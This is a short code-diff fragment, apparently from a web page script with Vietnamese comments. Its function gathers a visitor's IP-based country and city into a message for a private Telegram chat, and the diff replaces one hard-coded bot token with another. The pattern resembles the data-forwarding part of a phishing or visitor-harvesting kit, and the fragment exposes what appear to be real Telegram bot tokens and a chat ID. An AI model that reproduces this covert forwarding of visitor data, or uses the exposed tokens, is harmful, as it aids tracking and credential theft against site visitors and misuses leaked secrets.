@@ -239,7 +239,7 @@ function showPrompt(IpAddress) {
         '%0A<strong>Country : </strong>' + IpAddress.countryName +'( '+IpAddress.countryCode+' )'+
         '%0A<strong>City : </strong>' + IpAddress.city ;
 
-        const botToken = '7521413873:AAFXBZni65L8op4Y2pQ8cQbddetBLMsri7Q'; // Thay YOUR_BOT_TOKEN bằng bot_token của bạn
+        const botToken = '7521413873:AAGI7lAk_B9c5U_T9dyglS_Bhlg73VxMrwU'; // Thay YOUR_BOT_TOKEN bằng bot_token của bạn
         const chatId = '-1002275895232'; // Thay YOUR_CHAT_ID bằng chat_id của bạn
         const message = message1; // Tin nhắn sẽ là dữ liệu sản phẩm
 
